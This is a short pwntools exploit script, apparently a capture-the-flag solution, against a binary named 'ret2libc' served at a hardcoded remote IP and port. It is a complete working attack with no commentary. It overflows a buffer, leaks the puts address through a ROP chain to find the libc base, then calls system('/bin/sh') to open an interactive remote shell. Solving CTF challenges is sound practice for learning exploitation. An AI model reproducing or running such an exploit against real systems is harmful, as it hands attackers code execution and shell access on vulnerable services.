from pwn import *
context.binary = elf = ELF("./ret2libc", checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

s = remote('143.198.127.103', 42001)
#s = remote('localhost', 10000)

pop_rdi = 0x0040155b
payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.learn)

s.sendline(payload)

print(s.recvuntil(b'I see, you must be a natural!\n'))
s.recvline()

libc.address = u64((s.recvline()[:-1]).ljust(8, b'\x00')) - libc.symbols.puts
print('libc_base:', hex(libc.address))

binsh = libc.address + 0x18a152
ret = 0x00401016

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols.system)

s.sendline(payload)

s.interactive()
